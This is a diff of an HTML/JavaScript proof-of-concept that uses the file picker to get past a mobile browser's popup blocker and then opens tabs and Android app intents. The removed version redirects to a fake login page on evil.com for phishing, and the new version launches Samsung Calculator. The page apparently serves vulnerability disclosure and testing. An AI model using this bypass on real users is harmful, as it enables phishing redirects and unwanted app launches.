@@ -1,45 +1,73 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Popup/Redirect Bypass – Dual Abuse PoC</title>
-</head>
-<body>
-<h2>File Picker → App Launch / Phishing</h2>
-<p>Pick any file. Depending on the mode, it will either:</p>
-<ul>
-<li>📱 Launch the Phone Dialer</li>
-<li>🎭 Redirect to a fake login page (evil.com)</li>
-</ul>
+<!doctype html>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Dual-hit PoC — Google + Calculator</title>
+<style>
+  html,body{height:100%;margin:0;font-family:Arial,Helvetica,sans-serif;background:#f7f8fb}
+  .wrap{height:100%;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:24px}
+  button{padding:14px 18px;border-radius:10px;background:#0b63d6;color:#fff;border:0;font-size:16px;cursor:pointer}
+  .note{margin-top:14px;color:#555;max-width:640px;text-align:center}
+</style>
 
-<select id="mode">
-  <option value="dialer">📱 Launch Dialer</option>
-  <option value="phish">🎭 Fake Login Page</option>
-</select>
-<br><br>
-<button onclick="trigger()">Pick File & Exploit</button>
+<div class="wrap">
+  <button id="go">Pick file & run dual payload</button>
+  <div class="note">
+    Tap to open the system file picker. After selecting a file this PoC will open Google in a new tab and then attempt to launch Samsung Calculator via an intent.
+  </div>
+</div>
 
 <script>
-async function trigger() {
-    const mode = document.getElementById('mode').value;
-    try {
-        // Step 1: Trigger file picker (consumes popup/redirect block)
-        await window.showOpenFilePicker();
+const btn = document.getElementById('go');
 
-        // Step 2: Payload switch
-        if (mode === 'dialer') {
-            // Cross-app abuse: Open phone dialer with number 12345
-            window.open(
-              'intent://12345#Intent;scheme=tel;package=com.android.server.telecom;end',
-              '_blank'
-            );
-        } else if (mode === 'phish') {
-            // Phishing: Redirect to fake login page
-            window.open('https://evil.com/fake-login', '_blank');
-        }
-    } catch (e) {
-        alert('Error: ' + e);
+// Samsung Calculator package (common on Samsung devices)
+const samsungCalcIntent = 'intent://#Intent;action=android.intent.action.MAIN;package=com.sec.android.app.popupcalculator;end';
+
+// Small helper to open google then intent
+async function dualFlow() {
+  try {
+    // Attempt FS Access API if available (opens system picker as an activity)
+    if (window.showOpenFilePicker) {
+      await showOpenFilePicker({ multiple: false });
+    } else {
+      // fallback: create and click a hidden input[type=file]
+      const input = document.createElement('input');
+      input.type = 'file';
+      input.accept = '*/*';
+      input.style.display = 'none';
+      document.body.appendChild(input);
+      input.click();
+      // wait for a file selection (or user cancel) — listen for change or timeout
+      await new Promise((resolve) => {
+        let resolved = false;
+        input.addEventListener('change', () => { if (!resolved) { resolved = true; resolve(); }}, {once:true});
+        setTimeout(() => { if (!resolved) { resolved = true; resolve(); } }, 10000);
+      });
+      input.remove();
     }
+
+    // Step A: open google in a new tab — opens a visible page for phishing/demo
+    const googleWin = window.open('https://www.google.com', '_blank');
+
+    // Step B: shortly after, attempt to launch Samsung Calculator via intent
+    // Use a small delay so the new tab is created first (helps demonstration)
+    setTimeout(() => {
+      try {
+        // Use window.open with _blank so Chrome attempts an intent handler
+        window.open(samsungCalcIntent, '_blank');
+      } catch (e) {
+        // final fallback: navigate current page (will replace current tab)
+        window.location.href = samsungCalcIntent;
+      }
+    }, 250); // 250ms delay; tweak if needed
+
+  } catch (err) {
+    // Show error info for triage/testing
+    alert('Error during PoC: ' + (err && err.message ? err.message : String(err)));
+    console.warn(err);
+  }
 }
+
+btn.addEventListener('click', (e) => {
+  e.preventDefault();
+  dualFlow();
+});
 </script>
-</body>
-</html>
